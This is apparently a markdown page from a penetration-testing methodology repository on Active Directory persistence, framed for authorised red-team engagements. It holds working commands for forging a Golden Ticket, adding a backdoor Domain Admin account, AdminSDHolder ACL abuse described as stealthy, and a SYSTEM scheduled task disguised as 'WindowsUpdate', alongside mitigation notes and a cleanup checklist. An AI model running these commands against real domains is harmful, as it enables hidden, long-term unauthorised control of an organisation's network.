# 🔒 07 — Persistence

---

## Overview

```
Persistence = maintaining access after the engagement clock restarts.
Used in red team / multi-phase engagements.

⚠️ Always document and clean up ALL persistence mechanisms after engagement.
⚠️ In exam (OSCP) or CTF contexts — skip persistence, grab proof.txt and move on.
```

---

## Golden Ticket (Long-Term Access)

```bash
# Requires: krbtgt NTLM hash + Domain SID (obtained in Phase 06)
# Default validity: 10 years — survives password resets until krbtgt rotated TWICE

# Forge on Kali
sudo impacket-ticketer \
  -nthash KRBTGT_NTHASH \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain $domain \
  administrator

export KRB5CCNAME=./administrator.ccache
sudo impacket-psexec $domain/administrator@DC01.$domain \
  -target-ip $ip -dc-ip $ip -k -no-pass

# Mitigation: Reset krbtgt password twice (24hr apart) to invalidate all tickets
```

---

## Backdoor Domain Admin Account

```bash
# Create low-visibility account
net user svc_backup Password123! /add /domain
net group "Domain Admins" svc_backup /add /domain

# Verify
net group "Domain Admins" /domain | grep svc_backup

# ⚠️ New DA accounts generate SIEM alerts — prefer ACL-based persistence
```

---

## AdminSDHolder Abuse

AdminSDHolder propagates permissions to all protected groups (DA, EA, etc.) every 60 minutes via SDProp.

```bash
# Add GenericAll to AdminSDHolder object for your account
# PowerView (Windows)
Add-DomainObjectAcl \
  -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity $user \
  -Rights All

# After 60 min (or forced SDProp), your account has GenericAll on all protected groups
# Then: ForceChangePassword on any DA, or add yourself directly

# ⚠️ Stealthy — does not appear in standard DA group membership queries
```

---

## Scheduled Task Persistence

```bash
# Create scheduled task (needs local admin or DA)
schtasks /create /tn "WindowsUpdate" \
  /tr "C:\Windows\Tasks\shell.exe" \
  /sc onlogon /ru SYSTEM /f

# Verify
schtasks /query /tn "WindowsUpdate"

# ⚠️ Clean up after engagement
schtasks /delete /tn "WindowsUpdate" /f
```

---

## Cleanup Checklist (Post-Engagement)

```
[ ] Remove any created user accounts
[ ] Remove scheduled tasks created during engagement
[ ] Delete all uploaded tools and payloads from targets
[ ] Remove AdminSDHolder ACL additions
[ ] Clear relevant event logs (if in scope)
[ ] Document all persistence mechanisms in final report
[ ] Confirm client is aware of all remaining access paths
```

---

**MITRE ATT&CK:** T1558.001 (Golden Ticket) · T1078.002 (Domain Accounts) · T1484 (Domain Policy Modification) · T1053.005 (Scheduled Task)

[← Domain Dominance](../06-domain-dominance/README.md) | [← Back to Main](../README.md)
